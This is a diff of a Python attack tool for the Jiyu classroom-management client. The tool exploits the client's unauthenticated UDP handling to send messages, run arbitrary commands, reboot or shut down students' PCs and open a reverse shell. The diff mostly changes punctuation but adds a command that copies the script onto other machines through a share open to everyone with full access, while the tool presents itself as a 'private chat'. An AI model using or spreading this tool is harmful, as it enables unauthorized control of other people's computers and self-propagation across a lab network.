@@ -38,30 +38,30 @@ header = """
 parser = argparse.ArgumentParser(header)  # 添加一个命令参数解析器
 parser.add_argument("-ip", type=str, help="ip 指定目标IP地址")
 parser.add_argument(
-    "-p", type=int, default=4705, help="port 指定监听端口，默认端口为4705"
+    "-p", type=int, default=4705, help="port 指定监听端口,默认端口为4705"
 )
 parser.add_argument(
-    "-msg", type=str, help='send_message发送消息 eg: -msg  "HelloWord!"'
+    "-msg", type=str, help='send_message发送消息 eg: -msg  "CialloWord!"'
 )
 parser.add_argument("-c", type=str, help='command命令 eg: -c   "cmd.exe /c ipconfig"')
-parser.add_argument("-l", type=int, default=1, help="循环次数，默认为1")
-parser.add_argument("-t", type=int, default=22, help="循环时间间隔，默认是22秒")
+parser.add_argument("-l", type=int, default=1, help="循环次数,默认为1")
+parser.add_argument("-t", type=int, default=22, help="循环时间间隔,默认是22秒")
 
-parser.add_argument("-whoSend", type=int, default=0, help="定义谁给你发送的消息，用于小小私聊：接收方")
+parser.add_argument("-whoSend", type=int, default=0, help="定义谁给你发送的消息,用于小小私聊:接收方")
 
 parser.add_argument(
     "-e",
     type=str,
     choices=["r", "s", "g", "nc", "break", "continue"],
-    help="Extra Options加载额外的选项 eg：-e r",
+    help="Extra Options加载额外的选项 eg:-e r",
 )
 subparsers = parser.add_subparsers(help="-e 参数的详细说明")
 subparsers.add_parser("r", help="reboot 重启")
 subparsers.add_parser("s", help="shutdown 关机")
-subparsers.add_parser("g", help="独立选项，获取当前的ip地址以及学生端监听的端口")
-subparsers.add_parser("nc", help="独立选项，反弹shell的机器需出网，退出可使用命令exit")
-subparsers.add_parser("break", help="独立选项，脱离屏幕控制，需要管理员权限")
-subparsers.add_parser("continue", help="独立选项，恢复屏幕控制")
+subparsers.add_parser("g", help="独立选项,获取当前的ip地址以及学生端监听的端口")
+subparsers.add_parser("nc", help="独立选项,反弹shell的机器需出网,退出可使用命令exit")
+subparsers.add_parser("break", help="独立选项,脱离屏幕控制,需要管理员权限")
+subparsers.add_parser("continue", help="独立选项,恢复屏幕控制")
 args = parser.parse_args()
 
 
@@ -134,7 +134,7 @@ def pkg_sendlist(cmdtype, content):
 
 # 发送
 def send(send_list):
-    if len(send_list) == 0:  # 此处插入myChat， 程序没有给定任意参数时执行此处
+    if len(send_list) == 0:  # 此处插入myChat, 程序没有给定任意参数时执行此处
 
         print("[*] tips: 可以使用 -h 以获取交互式命令帮助~")
         sleep(1)
@@ -183,7 +183,7 @@ def creat_send_object():
 
 
 def single_command():  # 关于 -e 参数的子选项
-    if args.e == "g":  # 当参数为g时，列出学生端的监听端口
+    if args.e == "g":  # 当参数为g时,列出学生端的监听端口
         try:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
@@ -199,11 +199,11 @@ def single_command():  # 关于 -e 参数的子选项
 
             ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
             print("\nYour student client possible ports are:" + ",".join(ports))
-        except:  # 即使出错了，也正常执行退出
+        except:  # 即使出错了,也正常执行退出
             pass
         sys.exit(0)
 
-    elif args.e == "break":  # 当参数为break时，屏蔽学生端的端口
+    elif args.e == "break":  # 当参数为break时,屏蔽学生端的端口
         os.popen("sc config MpsSvc start= auto")
         os.popen("net start MpsSvc")
         os.popen("netsh advfirewall set allprofiles state on")
@@ -214,7 +214,7 @@ def single_command():  # 关于 -e 参数的子选项
         os.system("cls")
         sys.exit(0)
 
-    elif args.e == "continue":  # 当参数为continue时，放行学生端的端口
+    elif args.e == "continue":  # 当参数为continue时,放行学生端的端口
         os.popen(
             'netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow'
         )
@@ -235,13 +235,13 @@ def netcat(num):
 def run_from_cmd():
     try:
         single_command()  # 先检测是否有g参数 如果没有就跳过（无事发生）
-        if args.e != "nc":  # 如果参数不为!nc，则执行send函数，用于
+        if args.e != "nc":  # 如果参数不为!nc,则执行send函数,用于
             send_list = creat_send_object()
             send(send_list)
             sys.exit(0)
         num = random.randint(
             1, 65535
-        )  # 当参数为-e nc时执行的内容。作用：反弹shell。适用平台：Windows
+        )  # 当参数为-e nc时执行的内容。作用:反弹shell。适用平台:Windows
         pool = Pool(processes=1)
         pool.apply_async(netcat, (num,))
         print("listening on [any] {} ...".format(num))
@@ -262,26 +262,26 @@ def run_from_cmd():
 def chat_main():
     global NoExit
     NoExit = True
-    print("\n\n ~~欢迎使用 *小小私聊*！~~\n\n")
-    print("原理：因为极域的学生端没有对接收到的udp包做身份验证，导致了我们可以构造特定的数据包让学生端来执行，从而实现操作机房内上线的任意学生端机器。")
+    print("\n\n ~~欢迎使用 *小小私聊*!~~\n\n")
+    print("原理:因为极域的学生端没有对接收到的udp包做身份验证,导致了我们可以构造特定的数据包让学生端来执行,从而实现给机房内上线的任意学生端机器发送消息。")
 
     print("Author: ht0Ruial, 2409(duck)")
 
     print("Version:%s" % version)
 
 
-    print("你的IP地址：" + getIP())
+    print("你的IP地址:" + getIP())
 
-    print("你的网段：" + get_IP_prefix(getIP()) + "x")
-    print("右键本文件所在路径，点击属性，点击共享，点击高级，输入guest回车，即可共享给其他同学！")
+    print("你的网段:" + get_IP_prefix(getIP()) + "x")
+    print("右键本文件所在路径,点击属性,点击共享,点击高级,输入guest回车,即可共享给其他同学!")
 
     print("\npowerd by Jiyu_udp_attack\n\n")
     StuID = chat_whoami()
-    print("你好， %s 号同学！" % StuID)
+    print("你好, %s 号同学!" % StuID)
     prefix = "%s号同学:" % StuID
     while True:
         global toStuID
-        toStuID = int(input("你想和几号同学说悄悄话？在此输入号数\n："))
+        toStuID = int(input("你想和几号同学说悄悄话？在此输入号数\n:"))
         print("正在尝试寻找你所说的{}号同学".format(toStuID), end="")
         for i in range(10):
             print(".", end="")
@@ -289,12 +289,12 @@ def chat_main():
         print(chat_StuID2IP(toStuID))
         if debug == True or isOnline(get_IP_prefix(getIP()) + str(chat_StuID2IP(toStuID))): # 检查对方是否在线
             transfer_program()
-            print("似乎找到了！")
-            msg = "你好呀，%i号同学" % toStuID
+            print("似乎找到了!")
+            msg = "你好呀,%i号同学" % toStuID
             while msg != "bye":
-                msg = str(input("和{}号悄悄说：".format(toStuID)))
+                msg = str(input("和{}号悄悄说:".format(toStuID)))
                 if msg == "":
-                    print("不可发送空白消息！")
+                    print("不可发送空白消息!")
                 else:
                     send_msg(prefix + msg)
                     sleep(1)
@@ -333,7 +333,7 @@ def chat_whoami():      # 给出当前机器主网卡ip的最后一段数字
     return StuID
 
 
-def chat_StuID2IP(StuID: int):      # 给出学生号数，求出ip最后一段
+def chat_StuID2IP(StuID: int):      # 给出学生号数,求出ip最后一段
     if StuID / 6 == StuID // 6: 
         OP = StuID / 6
         ip_last_digit = 60 + OP
@@ -342,14 +342,14 @@ def chat_StuID2IP(StuID: int):      # 给出学生号数，求出ip最后一段
         TP = R * 10
         OP = StuID // 6 + 1
         ip_last_digit = TP + OP
-        # 求十位时，其为原号数除以6的余数（R）乘10，TP：十位
-        # 求个位时，其为原号数除以6，向下取整，然后加1，OP：个位
+        # 求十位时,其为原号数除以6的余数（R）乘10,TP:十位
+        # 求个位时,其为原号数除以6,向下取整,然后加1,OP:个位
     result = int(ip_last_digit)
     return result
 
 
-def chat_IP2StuID2(ip_last_digit):  # 给出IP最后一段，求出号数
-    for mayStuID in range(1, 61):  # range起始不能为0，否则当ip_last_digit为60时则输出0
+def chat_IP2StuID2(ip_last_digit):  # 给出IP最后一段,求出号数
+    for mayStuID in range(1, 61):  # range起始不能为0,否则当ip_last_digit为60时则输出0
         StuIP = chat_StuID2IP(mayStuID)
         if StuIP == ip_last_digit:
             return mayStuID
@@ -375,7 +375,7 @@ def transfer_program():
     file_name = os.path.basename(current_path)
     share_folder = r"E:\小小私聊"
     local_cmd = "net share 点我聊天=E:\\小小私聊 /grant:everyone,FULL"
-    remote_cmd = "explorer \\\\ " +getIP()
+    remote_cmd = "copy \\\\" + getIP() + " \\点我聊天\chat.py E:\小小私聊\chat.py"
     try:
         os.mkdir(share_folder)
         shutil.copy(current_path, share_folder)
@@ -391,5 +391,5 @@ version = 20241110
 debug = True
 NoExit = False
 
-if __name__ == "__main__":  # 程序最先执行此处！当用户双击直接执行本脚本时...
+if __name__ == "__main__":  # 程序最先执行此处!当用户双击直接执行本脚本时...
     run_from_cmd()
